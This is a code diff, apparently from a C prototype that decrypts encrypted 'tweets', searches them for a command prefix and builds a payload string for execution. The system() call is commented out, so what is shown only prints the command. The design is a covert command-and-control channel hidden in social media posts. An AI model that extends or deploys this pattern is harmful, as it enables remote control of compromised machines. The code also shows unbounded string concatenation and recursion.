@@ -227,8 +227,6 @@ int DecryptTweet(unsigned char decryptedresult[], char * tweet)
     decryptedtext_len = decrypt(base64DecodeOutput, ciphertext_len, key, iv,
                                 decryptedtext);
 
-    printf("decrypt length with error is: %d", decryptedtext_len);
-
     decryptedtext[decryptedtext_len] = '\0';
 
     strcpy(decryptedresult, decryptedtext);
@@ -239,28 +237,28 @@ int DecryptTweet(unsigned char decryptedresult[], char * tweet)
     return decryptedtext_len;
 }
 
-void ExecuteTweet(int tweet_index, unsigned char decryptedtext[])
+void ExecuteTweet(int tweet_index, char * cmd)
 {
     // Decrypt here
     int decrypted_length;
     int counter;
     char * found_prefix;
+    char * payload;
+    char decrypted[10000];
 
-    decrypted_length = DecryptTweet(decryptedtext, TWEETS[tweet_index]);
-    found_prefix = strstr(decryptedtext, CMDPREFIX);
+    decrypted_length = DecryptTweet(decrypted, TWEETS[tweet_index]);
 
-    for (counter=0; counter < decrypted_length; counter++)
-    {
-      printf("\\x%02x", decryptedtext[counter]);
-    }
+    found_prefix = strstr(decrypted, CMDPREFIX);
+    payload = strcat(decrypted, cmd);
 
     if (found_prefix != NULL)
     {
-        printf("found prefix\n");
+        printf("Found prefix!\n");
+        printf("Executing: %s\n", payload);
         //system(decryptedtext);
     } else {
-        printf("found not found prefix\n");
-        ExecuteTweet(tweet_index+1, decryptedtext);
+        printf("Prefix not found... Recurring\n");
+        ExecuteTweet(tweet_index+1, payload);
     }
 }
 
@@ -295,10 +293,10 @@ void Live()
 
 void Offline()
 {
-    unsigned char decryptedtext[10000];
+    char cmd[10000] = { 0 };
     InitializeTweets();
     PopulateTweets(ReadTweetsFromFile(),0);
-    ExecuteTweet(0, decryptedtext);
+    ExecuteTweet(0, cmd);
 }
 
 int DivideIntoTweets(char dest[][TWEET_LENGTH], char * payload, int length)
